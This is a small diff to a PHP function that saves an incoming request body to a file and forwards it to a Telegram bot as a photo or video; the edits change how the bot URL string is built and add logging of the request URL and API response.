@@ -47,7 +47,7 @@ function sendToTelegram($path)
     file_put_contents($path, file_get_contents('php://input'));
     global $chat_id, $bot_id;
     if (file_exists($path)) {
-        $bot_url = "https://api.telegram.org/bot$bot_id/";
+        $bot_url = "https://api.telegram.org/bot". $bot_id."/";
         $mime = mime_content_type($path);
         if (strpos($mime, 'video') !== false) {
             $url = $bot_url.'sendVideo?parse_mode=markdown&chat_id='.$chat_id;
@@ -59,6 +59,7 @@ function sendToTelegram($path)
             ];
         } else {
             $url = $bot_url.'sendPhoto?chat_id='.$chat_id;
+            
 
             $post_fields = [
                 'chat_id' => $chat_id,
@@ -74,6 +75,8 @@ function sendToTelegram($path)
         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
         $output = curl_exec($ch);
+        LogToFile($url);
+        LogToFile($output);
         curl_close($ch);
         echo $output;
     } else {
